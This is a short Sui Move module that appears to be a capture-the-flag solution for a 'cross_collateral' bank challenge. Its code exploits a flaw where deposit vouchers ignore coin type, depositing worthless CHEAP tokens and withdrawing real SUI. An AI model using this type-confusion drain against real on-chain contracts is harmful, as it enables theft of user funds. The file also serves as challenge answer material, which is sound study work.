module solution::solve;

use cross_collateral::bank::{Self, Bank};
use cross_collateral::cheap::CHEAP;
use sui::coin::Coin;
use sui::sui::SUI;

// the voucher carries only an amount, not a type: deposit worthless CHEAP, redeem it for SUI.
public fun solve(bank: &mut Bank, cheap: Coin<CHEAP>, ctx: &mut TxContext) {
    let voucher = bank::deposit<CHEAP>(bank, cheap, ctx);
    let loot = bank::withdraw<SUI>(bank, voucher, ctx);
    transfer::public_transfer(loot, ctx.sender());
}
